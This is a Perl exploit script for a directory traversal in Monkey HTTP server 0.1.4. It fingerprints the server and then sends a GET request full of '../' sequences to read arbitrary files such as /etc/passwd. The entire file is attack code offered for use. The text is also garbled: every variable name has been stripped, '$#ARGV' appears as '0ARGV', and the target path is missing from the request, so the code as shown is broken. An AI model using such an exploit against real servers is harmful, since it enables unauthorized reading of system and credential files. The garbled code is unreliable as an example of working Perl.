#!/usr/bin/perl
#
# (0 day;) Monkey-0.1.4 reverse traversal exploit
#
# Usage:
#    perl monkey.pl <hostname> <httpport> <file>
#
#    <hostname> - target host
#    <httpport> - port on which HTTP daemon is listening
#    <file>     - file which you wanna get
#
# Example:
#    perl monkey.pl www.ii-labs.org 80 /etc/passwd
#
#                             by DownBload <downbload@hotmail.com>
#                             Illegal Instruction Labs
#
use IO::Socket;

 sub sock () {
    = IO::Socket::INET->new (PeerAddr => ,
                                  PeerPort => ,
                                  Proto    => "tcp")
   || die "[ ERROR: Can't connect to !!! ]\n\n";
 }

 sub banner() {
  print "[--------------------------------------------------]\n";
  print "[       Monkey-0.1.4 reverse traversal exploit     ]\n";
  print "[        by DownBload <downbload\@hotmail.com>      ]\n";
  print "[             Illegal Instruction Labs             ]\n";
  print "[--------------------------------------------------]\n";
 }

 if (0ARGV != 2)
 {
  banner();
  print "[ Usage:                                           ]\n";
  print "[    perl monkey.pl <hostname> <httpport> <file>   ]\n";
  print "[--------------------------------------------------]\n";
  exit(0);
 }

  = [0];
  = [1];
  = [2];

 banner();
 print "[ Connecting to ... ]\n";
 sock();
 print "[ Sending probe... ]\n";
 print  "HEAD / HTTP/1.0\n\n";
 while ( = <>) {  =  . ; }
 if ( =~ /Monkey/) { print "[ Monkey HTTP server found,
continuing... ]\n"; }
 else { die "[ SORRY: That's not Monkey HTTP server :( ]\n\n"; }
 close ();

 print "[ Connecting to ... ]\n";
 sock();
 print "[ Sending GET request... ]\n";
 print  "GET //../../../../../../../../../ HTTP/1.0\n\n";
 print "[ Waiting for response... ]\n\n";
 while ( = <>) { print ; }
 close ();